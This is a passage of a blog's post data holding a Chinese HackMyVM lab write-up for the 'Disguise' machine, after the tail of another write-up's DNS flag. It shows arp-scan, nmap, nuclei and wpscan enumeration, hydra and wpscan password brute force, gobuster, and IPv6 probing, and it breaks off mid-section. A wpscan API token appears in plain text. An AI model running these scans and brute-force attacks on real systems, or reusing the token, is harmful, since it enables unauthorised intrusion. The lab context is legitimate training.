'hmv{sasviyalin}'\n\n;; Query time: 388 msec\n;; SERVER: 192.168.205.2#53(192.168.205.2) (UDP)\n;; WHEN: Sat May 17 22:06:25 EDT 2025\n;; MSG SIZE  rcvd: 68\n```\n\nBingo! \u770b\u5230 `ANSWER SECTION` \u4e86\u5417\uff1f\n`hackmyvm.eu.            5       IN      TXT     'hmv{sasviyalin}'`\n\u8fd9\u4e0d\u5c31\u662f\u54b1\u4eec\u5bfb\u627e\u7684 Flag \u561b\uff01\n\n## Flag\n\n\u6beb\u65e0\u7591\u95ee\uff0cFlag \u5c31\u662f\uff1a\n\n`hmv{sasviyalin}`\nsentence", "top": 0, "createdAt": 1751016533, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P27": {"htmlDir": "docs/post/hmv_Disguise-ba-ji-shen-tou-ce-shi-xiang-jie.html", "labels": ["HackMyVM"], "postTitle": "hmv_Disguise\u9776\u673a\u6e17\u900f\u6d4b\u8bd5\u8be6\u89e3", "postUrl": "post/hmv_Disguise-ba-ji-shen-tou-ce-shi-xiang-jie.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/27", "commentNum": 0, "wordCount": 49873, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\u4e0e\u521d\u6b65\u63a2\u6d4b\n\n## 1.1 \u4e3b\u673a\u53d1\u73b0\n\n\u6e17\u900f\u6d4b\u8bd5\u7684\u7b2c\u4e00\u6b65\u901a\u5e38\u662f\u53d1\u73b0\u7f51\u7edc\u4e2d\u7684\u5b58\u6d3b\u4e3b\u673a\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528`arp-scan`\u5de5\u5177\u5bf9\u672c\u5730\u7f51\u7edc\u8fdb\u884c\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo arp-scan -l\n[sudo] password for kali:\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.\n192.168.205.211 08:00:27:ea:d3:f5       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:f8:d7:c5       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.028 seconds (126.23 hosts/sec). 4 responded\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0cIP\u5730\u5740\u4e3a `192.168.205.211` \u7684\u4e3b\u673a\u54cd\u5e94\u4e86ARP\u8bf7\u6c42\uff0c\u5176MAC\u5730\u5740\u4e3a `08:00:27:ea:d3:f5`\u3002\u8be5IP\u5c06\u4f5c\u4e3a\u6211\u4eec\u540e\u7eed\u6e17\u900f\u7684\u76ee\u6807\u3002\n\n## 1.2 \u7aef\u53e3\u626b\u63cf\n\n\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u540e\uff0c\u4f7f\u7528`nmap`\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p- --min-rate 10000 192.168.205.211\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 21:57 EDT\nNmap scan report for 192.168.205.211\nHost is up (0.00027s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.20 seconds\n```\n\nNmap\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86 TCP 22\u7aef\u53e3 (SSH\u670d\u52a1) \u548c TCP 80\u7aef\u53e3 (HTTP\u670d\u52a1)\u3002\n\n# \u4e8c\u3001Web\u5e94\u7528\u6e17\u900f\u6d4b\u8bd5\n\n## 2.1 \u57df\u540d\u89e3\u6790\u4e0e\u7ad9\u70b9\u8bc6\u522b\n\n\u76f4\u63a5\u901a\u8fc7IP\u5730\u5740\u8bbf\u95ee\u76ee\u6807\u4e3b\u673a\u7684HTTP\u670d\u52a1 (\u7aef\u53e380)\uff0c\u53d1\u73b0\u7f51\u9875\u5185\u5bb9\u63d0\u793a\u9700\u8981\u89e3\u6790\u57df\u540d\u3002\n![image-20250516095849516](https://7r1umphk.github.io/image/20250516095856656.webp)\n\n\u6839\u636e\u9875\u9762\u63d0\u793a\uff0c\u8be5\u7ad9\u70b9\u671f\u671b\u901a\u8fc7\u57df\u540d `http://disguise.hmv` \u8bbf\u95ee\u3002\u6211\u4eec\u5c06\u6b64\u57df\u540d\u4e0e\u76ee\u6807IP\u7684\u6620\u5c04\u5173\u7cfb\u6dfb\u52a0\u5230\u672c\u5730 `/etc/hosts` \u6587\u4ef6\u4e2d\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo '192.168.205.211 http://disguise.hmv' | sudo tee -a /etc/hosts > /dev/null\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ tail -n 1 /etc/hosts\n192.168.205.211 http://disguise.hmv\n```\n\n\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u901a\u8fc7\u57df\u540d `http://disguise.hmv` \u8bbf\u95ee\u7ad9\u70b9\u3002\u89c2\u5bdf\u9875\u9762\u9875\u811a\u4fe1\u606f\uff0c\u521d\u6b65\u5224\u65ad\u8be5\u7ad9\u70b9\u662f\u57fa\u4e8eWordPress\u6784\u5efa\u7684\u3002\n![image-20250516100842676](https://7r1umphk.github.io/image/20250516100842781.webp)\n\n## 2.2 WordPress\u6f0f\u6d1e\u626b\u63cf\u4e0e\u4fe1\u606f\u6536\u96c6\n\n### 2.2.1 Nuclei\u626b\u63cf\n\n\u9996\u5148\u5c1d\u8bd5\u4f7f\u7528`nuclei`\u5bf9\u76ee\u6807WordPress\u7ad9\u70b9\u8fdb\u884c\u81ea\u52a8\u5316\u6f0f\u6d1e\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nuclei -u http://disguise.hmv/\n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.4.2\n\n                projectdiscovery.io\n\n[INF] Current nuclei version: v3.4.2 (outdated)\n[INF] Current nuclei-templates version: v10.2.1 (latest)\n[WRN] Scan results upload to cloud is disabled.\n[INF] New templates added in latest release: 42\n[INF] Templates loaded for current scan: 7925\n[WRN] Loading 198 unsigned templates for scan. Use with caution.\n[INF] Executing 7727 signed templates from projectdiscovery/nuclei-templates\n[INF] Targets loaded for current scan: 1\n[INF] Templates clustered: 1736 (Reduced 1632 Requests)\n[INF] Using Interactsh Server: oast.pro\n[INF] No results found. Better luck next time!\n```\n\nNuclei\u626b\u63cf\u672a\u53d1\u73b0\u660e\u663e\u6f0f\u6d1e\u3002\u63a5\u4e0b\u6765\u4f7f\u7528\u66f4\u4e13\u4e1a\u7684WordPress\u626b\u63cf\u5de5\u5177`wpscan`\u3002\n\n### 2.2.2 WPScan\u626b\u63cf\n\n\u6267\u884c`wpscan`\u5bf9\u7ad9\u70b9\u8fdb\u884c\u8be6\u7ec6\u679a\u4e3e\uff0c\u5305\u62ec\u7528\u6237\u3001\u4e3b\u9898\u3001\u63d2\u4ef6\u7b49\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ wpscan --url 'http://disguise.hmv' --enumerate u,t,p,m --random-user-agent --api-token 6jJQ6zlZssGILOaGfCu2z7aVSLdYgEYokmESJuHejs8\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.28\n\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[i] Updating the Database ...\n[i] Update completed.\n\n[+] URL: http://disguise.hmv/ [192.168.205.211]\n[+] Started: Thu May 15 22:20:25 2025\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.59 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://disguise.hmv/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://disguise.hmv/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://disguise.hmv/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://disguise.hmv/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).\n | Found By: Rss Generator (Passive Detection)\n |  - http://disguise.hmv/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>\n |  - http://disguise.hmv/comments/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>\n\n[+] WordPress theme in use: newscrunch\n | Location: http://disguise.hmv/wp-content/themes/newscrunch/\n | Last Updated: 2025-05-07T00:00:00.000Z\n | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt\n | [!] The version is out of date, the latest version is 1.8.5\n | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1\n | Style Name: Newscrunch\n | Style URI: https://spicethemes.com/newscrunch\n | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...\n | Author: spicethemes\n | Author URI: https://spicethemes.com\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 1.8.4.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1, Match: 'Version: 1.8.4.2'\n\n[+] Enumerating Most Popular Plugins (via Passive Methods)\n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n\n[i] Plugin(s) Identified:\n\n[+] *\n | Location: http://disguise.hmv/wp-content/plugins/*/\n |\n | Found By: Urls In Homepage (Passive Detection)\n | Confirmed By: Urls In 404 Page (Passive Detection)\n |\n | The version could not be determined.\n\n[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:00:03 <===================================================================================================> (400 / 400) 100.00% Time: 00:00:03\n[+] Checking Theme Versions (via Passive and Aggressive Methods)\n\n[i] Theme(s) Identified:\n\n[+] newsblogger\n | Location: http://disguise.hmv/wp-content/themes/newsblogger/\n | Last Updated: 2025-05-07T00:00:00.000Z\n | Readme: http://disguise.hmv/wp-content/themes/newsblogger/readme.txt\n | [!] The version is out of date, the latest version is 0.2.5.6\n | [!] Directory listing is enabled\n | Style URL: http://disguise.hmv/wp-content/themes/newsblogger/style.css\n | Style Name: NewsBlogger\n | Style URI: https://spicethemes.com/newsblogger-wordpress-theme/\n | Description: NewsBlogger is a dynamic and versatile child theme for the popular NewCrunch WordPress theme. Perfec...\n | Author: spicethemes\n | Author URI: https://spicethemes.com\n |\n | Found By: Urls In Homepage (Passive Detection)\n | Confirmed By:\n |  Urls In 404 Page (Passive Detection)\n |  Known Locations (Aggressive Detection)\n |   - http://disguise.hmv/wp-content/themes/newsblogger/, status: 200\n |\n | [!] 2 vulnerabilities identified:\n |\n | [!] Title: NewsBlogger < 0.2.5.5 - Cross-Site Request Forgery to Arbitrary Plugin Installation\n |     Fixed in: 0.2.5.5\n |     References:\n |      - https://wpscan.com/vulnerability/916ba2a7-6592-4abf-acbf-63e46111b964\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1305\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2cac27-4a36-490f-b2d8-3c6f32843a38\n |\n | [!] Title: NewsBlogger < 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload\n |     Fixed in: 0.2.5.2\n |     References:\n |      - https://wpscan.com/vulnerability/ab2f96dc-e786-48db-8207-a76ec50d7e63\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1304\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85cea6b5-d57b-495e-a504-a0c1ba691637\n |\n | Version: 0.2.5.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://disguise.hmv/wp-content/themes/newsblogger/style.css, Match: 'Version: 0.2.5.1'\n\n[+] newscrunch\n | Location: http://disguise.hmv/wp-content/themes/newscrunch/\n | Last Updated: 2025-05-07T00:00:00.000Z\n | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt\n | [!] The version is out of date, the latest version is 1.8.5\n | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css\n | Style Name: Newscrunch\n | Style URI: https://spicethemes.com/newscrunch\n | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...\n | Author: spicethemes\n | Author URI: https://spicethemes.com\n |\n | Found By: Urls In Homepage (Passive Detection)\n | Confirmed By:\n |  Urls In 404 Page (Passive Detection)\n |  Known Locations (Aggressive Detection)\n |   - http://disguise.hmv/wp-content/themes/newscrunch/, status: 500\n |\n | Version: 1.8.4.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css, Match: 'Version: 1.8.4.2'\n\n[+] twentytwentyfive\n | Location: http://disguise.hmv/wp-content/themes/twentytwentyfive/\n | Last Updated: 2025-04-15T00:00:00.000Z\n | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfive/readme.txt\n | [!] The version is out of date, the latest version is 1.2\n | [!] Directory listing is enabled\n | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css\n | Style Name: Twenty Twenty-Five\n | Style URI: https://wordpress.org/themes/twentytwentyfive/\n | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/, status: 200\n |\n | Version: 1.0 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.0'\n\n[+] twentytwentyfour\n | Location: http://disguise.hmv/wp-content/themes/twentytwentyfour/\n | Latest Version: 1.3 (up to date)\n | Last Updated: 2024-11-13T00:00:00.000Z\n | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfour/readme.txt\n | [!] Directory listing is enabled\n | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css\n | Style Name: Twenty Twenty-Four\n | Style URI: https://wordpress.org/themes/twentytwentyfour/\n | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/, status: 200\n |\n | Version: 1.3 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.3'\n\n[+] twentytwentythree\n | Location: http://disguise.hmv/wp-content/themes/twentytwentythree/\n | Latest Version: 1.6 (up to date)\n | Last Updated: 2024-11-13T00:00:00.000Z\n | Readme: http://disguise.hmv/wp-content/themes/twentytwentythree/readme.txt\n | [!] Directory listing is enabled\n | Style URL: http://disguise.hmv/wp-content/themes/twentytwentythree/style.css\n | Style Name: Twenty Twenty-Three\n | Style URI: https://wordpress.org/themes/twentytwentythree\n | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://disguise.hmv/wp-content/themes/twentytwentythree/, status: 200\n |\n | Version: 1.6 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://disguise.hmv/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.6'\n\n[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to 'Plain' for those to be detected)\n Brute Forcing Attachment IDs - Time: 00:00:00 <===============================================================================================> (100 / 100) 100.00% Time: 00:00:00\n\n[i] No Medias Found.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 <=====================================================================================================> (10 / 10) 100.00% Time: 00:00:00\n\n[i] User(s) Identified:\n\n[+] simpleadmin\n | Found By: Author Posts - Author Pattern (Passive Detection)\n | Confirmed By:\n |  Wp Json Api (Aggressive Detection)\n |   - http://disguise.hmv/wp-json/wp/v2/users/?per_page=100&page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] simpleAdmin\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By:\n |  Rss Generator (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 7\n | Requests Remaining: 18\n\n[+] Finished: Thu May 15 22:20:43 2025\n[+] Requests Done: 598\n[+] Cached Requests: 26\n[+] Data Sent: 176.914 KB\n[+] Data Received: 23.432 MB\n[+] Memory used: 285.922 MB\n[+] Elapsed time: 00:00:18\n```\n\nWPScan\u626b\u63cf\u7ed3\u679c\u7684\u5173\u952e\u4fe1\u606f\uff1a\n\n*   `robots.txt`\u6587\u4ef6\u5b58\u5728\u3002\n*   WordPress \u7248\u672c\u4e3a `6.8.1` (\u6700\u65b0\u7248)\u3002\n*   \u4e3b\u9898 `newsblogger` \u7248\u672c\u4e3a `0.2.5.1`\uff0c\u5b58\u5728\u4e24\u4e2a\u5df2\u77e5\u6f0f\u6d1e\uff1a\n    *   `CVE-2025-1305`: NewsBlogger < 0.2.5.5 - CSRF to Arbitrary Plugin Installation.\n    *   `CVE-2025-1304`: NewsBlogger < 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload. \uff08\u8fd9\u4e2a\u770b\u8d77\u6765\u66f4\u6709\u5229\u7528\u4ef7\u503c\uff09\n*   \u53d1\u73b0\u7528\u6237 `simpleadmin` (\u4ee5\u53ca `simpleAdmin`\uff0c\u53ef\u80fd\u4e3a\u540c\u4e00\u7528\u6237)\u3002\n\n## 2.3 \u5bc6\u7801\u7206\u7834\u5c1d\u8bd5 (WordPress & SSH)\n\n\u57fa\u4e8e\u53d1\u73b0\u7684\u7528\u6237 `simpleadmin`\uff0c\u5c1d\u8bd5\u5bf9\u5176WordPress\u540e\u53f0\u5bc6\u7801\u8fdb\u884c\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ wpscan --url http://disguise.hmv -U simpleadmin -P /usr/share/wordlists/rockyou.txt --random-user-agent\n```\n\n\u540c\u65f6\uff0c\u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u7a97\u53e3\u5c1d\u8bd5\u7206\u7834SSH\u670d\u52a1\u5bc6\u7801\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ hydra -l simpleadmin -P 5000q.txt ssh://192.168.205.211 -I -u -f -e nsr -t 64\n```\n\n\u7ecf\u8fc7\u7ea610\u5206\u949f\u7684\u7b49\u5f85\uff0c\u4e24\u4e2a\u7206\u7834\u5747\u672a\u6210\u529f\uff0c\u5224\u65ad\u5bc6\u7801\u7206\u7834\u7684\u8def\u5f84\u53ef\u80fd\u884c\u4e0d\u901a\u3002\n\n## 2.4 Web\u76ee\u5f55\u7206\u7834\n\n\u5c1d\u8bd5\u4f7f\u7528`gobuster`\u5bf9`http://disguise.hmv`\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u4ee5\u53d1\u73b0\u53ef\u80fd\u5b58\u5728\u7684\u9690\u85cf\u9875\u9762\u6216\u8d44\u6e90\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gobuster dir -u http://disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://disguise.hmv\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php,txt,md,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 277]\n/.html                (Status: 403) [Size: 277]\n/index.php            (Status: 301) [Size: 0] [--> http://disguise.hmv/]\n/rss                  (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/]\n/login                (Status: 302) [Size: 0] [--> http://disguise.hmv/wp-login.php]\n/login.php            (Status: 302) [Size: 0] [--> http://disguise.hmv/wp-login.php]\n/0                    (Status: 301) [Size: 0] [--> http://disguise.hmv/0/]\n/feed                 (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/]\n/atom                 (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/atom/]\n/s                    (Status: 301) [Size: 0] [--> http://disguise.hmv/sample-page/]\n/wp-content           (Status: 301) [Size: 317] [--> http://disguise.hmv/wp-content/]\n/admin                (Status: 302) [Size: 0] [--> http://disguise.hmv/wp-admin/]\n/h                    (Status: 301) [Size: 0] [--> http://disguise.hmv/2025/04/01/hello-world/]\n/wp-login.php         (Status: 200) [Size: 5275]\n/rss2                 (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/]\n/license.txt          (Status: 200) [Size: 19903]\n/wp-includes          (Status: 301) [Size: 318] [--> http://disguise.hmv/wp-includes/]\n/wp-register.php      (Status: 301) [Size: 0] [--> http://disguise.hmv/wp-login.php?action=register]\n/S                    (Status: 301) [Size: 0] [--> http://disguise.hmv/sample-page/]\n/wp-rss2.php          (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/]\n/H                    (Status: 301) [Size: 0] [--> http://disguise.hmv/2025/04/01/hello-world/]\n/sa                   (Status: 301) [Size: 0] [--> http://disguise.hmv/sample-page/]\n/rdf                  (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/rdf/]\n/page1                (Status: 301) [Size: 0] [--> http://disguise.hmv/]\nProgress: 9864 / 1323360 (0.75%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 9882 / 1323360 (0.75%)\n[ERROR] context canceled\n[ERROR] context canceled\n[ERROR] context canceled\n===============================================================\nFinished\n===============================================================\n```\n\n\u76ee\u5f55\u7206\u7834\u8fd0\u884c\u7ea62\u5206\u949f\u540e\uff0c\u53d1\u73b0\u626b\u63cf\u901f\u5ea6\u975e\u5e38\u7f13\u6162\uff0c\u63a8\u6d4bWordPress\u7ad9\u70b9\u53ef\u80fd\u5b58\u5728WAF\u6216\u5176\u4ed6\u9632\u62a4\u673a\u5236\u3002\u51b3\u5b9a\u6682\u505c\u626b\u63cf\uff0c\u5bfb\u627e\u5176\u4ed6\u7a81\u7834\u53e3\u3002\n\n# \u4e09\u3001\u7f51\u7edc\u5c42\u9762\u4fe1\u606f\u53d1\u6398\n\n## 3.1 IPv6\u63a2\u6d4b\n\n\u5c1d\u8bd5\u4eceIPv6\u5c42\u9762\u8fdb\u884c\u63a2\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ping6 -I eth0 ff02::1\nping6: Warning: IPv6 link-local address on ICMP datagram socket may require ifname or scope-id => use: address%<ifname|scope-id>\nping6: Warning: source address might be selected on device other than: eth0\nPING ff02::1 (ff02::1) from :: eth0: 56 data bytes\n64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=1 ttl=64 time=0.112 ms\n64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=1 ttl=64 time=0.744 ms\n64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=2 ttl=64 time=0.036 ms\n64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=2 ttl=64 time=0.322 ms\n^C\n--- ff02::1 ping statistics ---\n2 packets transmitted, 2 received, +2 duplicates, 0% packet loss, time 1022ms\nrtt min/avg/max/mdev = 0.036/0.303/0.744/0.275 ms\n```\n\n`ping6`\u53d1\u73b0\u4e86\u4e24\u4e2aIPv6\u672c\u5730\u94fe\u8def\u5730\u5740\u3002\u5176\u4e2d `fe80::a00:27ff:feea:d3f5%eth0` \u7684MAC\u5730\u5740\u4e0e\u4e4b\u524dIPv4\u626b\u63cf\u7684\u76ee\u6807\u4e3b\u673aMAC\u5730\u5740 `08:00:27:EA:D3:F5` \u76f8\u7b26 (EUI-64\u8f6c\u6362)\u3002\n\u5bf9\u8fd9\u4e24\u4e2aIPv6\u5730\u5740\u8fdb\u884c`nmap`\u7aef\u53e3\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -6 -p- fe80::9ffa:901:c1:10b9%eth0  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT\nNmap scan report for fe80::9ffa:901:c1:10b9\nHost is up (0.0000070s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 1.33 seconds\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -6 -p- fe80::a00:27ff:feea:d3f5%eth0\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT\nNmap scan report for fe80::a00:27ff:feea:d3f5\nHost is up (0.00011s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.40 seconds\n```\n\n\u5bf9\u4e0e\u76ee\u6807MAC\u5730\u5740\u4e00\u81f4\u7684IPv6\u5730\u5740 `fe80::a00:27ff:feea:d3f5%eth0` \u8fdb\u884c\u670d\u52a1\u7248\u672c\u63a2\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -6 -sV -p22,80 fe80::a00:27ff:feea:d3f5%eth0\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:42 EDT\nNmap scan report for fe80::a00:27ff:feea:d3f5\nHost is up (0.00032s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.59 ((Debian))\nMAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.59 seconds\n```\n\nIPv6\u626b\u63cf\u7ed3\u679c\u4e0eIPv4\u4e00\u81f4\uff0c\u5f00\u653eSSH (OpenSSH 7.9p1) \u548c HTTP (Apache 2.4.59) \u670d\u52a1\u3002\n\n## 3.2 